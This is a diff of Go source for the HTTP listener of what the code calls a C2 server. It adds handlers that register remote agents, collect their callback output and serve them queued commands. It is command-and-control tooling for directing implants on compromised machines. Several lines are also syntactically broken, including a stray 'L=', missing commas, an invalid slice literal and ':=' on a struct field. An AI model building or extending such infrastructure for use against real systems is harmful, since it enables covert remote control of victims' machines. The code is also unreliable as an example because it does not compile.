@@ -18,25 +18,64 @@ type HttpListener struct {
 
 func (h *HttpListener) checkInHandler(w http.ResponseWriter, r *http.Request) {
 	h.requestLog.Printf("Time: %v, Method: %s, URL: %s, RemoteAddr: %s\n", time.Now(), r.Method, r.URL, r.RemoteAddr)
+	gofakeit.Seed(0)
+	noun := gofakeit.Noun()
+	adj := gofakeit.Adjective()
+	id := fmt.Sprintf("%s_%s", adj, noun)
+	host, _, _ L= net.SplitHostPort(r.RemoteAddr)
 
+	AgentMap.Add(&Agent{
+		Id: id,
+		Ip: host
+		LastCall: time.Now(),
+		CmdQueue: ([][]string, 0)
+	})
+
+	w.Write([]byte(id))
+}
+
+func (h *HttpListener) callBackHandler(w http.ResponseWriter, r *http.Request) {
+	h.requestLog.Printf("Time: %v, Method: %s, URL: %s, RemoteAddr: %s\n", time.Now(), r.Method, r.URL, r.RemoteAddr)
+	id := r.Header.Get("User-Agent")
+	if agent := AgentMap.Get(id); id != nil {
+		agent.LastCall := time.Now()
+		if CurrentAgent.Id == agent.Id {
+			body, err := io.ReadAll(r.Body)
+			if err != nil {
+				return
+			}
+			r.Body.Close()
+			fmt.Printf("\n[*] Agent called back, send %d bytes\n", len(r.Body))
+			fmt.Println(string(body))
+			fmt.Printf("C2 %s > ", CurrentAgent.Id)
+			return
+		} else {
+			// Todo, Save to file
+			return
+		}
+	}
+	return
 }
 
 func (h *HttpListener) getTasksHandler(w http.ResponseWriter, r *http.Request) {
 	h.requestLog.Printf("Time: %v, Method: %s, URL: %s, RemoteAddr: %s\n", time.Now(), r.Method, r.URL, r.RemoteAddr)
-	task := map[string]interface{}{
-		"cmd":  "echo",
-		"args": []string{"hello world"},
+	id := r.Header.Get("User-Agent")
+	if agent := AgentMap.Get(id); id != nil {
+		agent.LastCall := time.Now()
+		if task, err := AgentMap.Dequeue(id); task != nil && err == nil {
+			jsonData, err := json.Marshal(&task)
+			if err != nil {
+				return
+			}
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusOK)
+			w.Write(jsonData)
+			return
+		} else {
+			return
+		}
 	}
-	jsonData, err := json.Marshal(task)
-	if err != nil {
-		h.errorLog.Println("Error marshalling JSON:", err)
-		w.WriteHeader(http.StatusInternalServerError)
-		return
-	}
-
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(http.StatusOK)
-	w.Write(jsonData)
+	return
 }
 
 func (h *HttpListener) StartListener() {
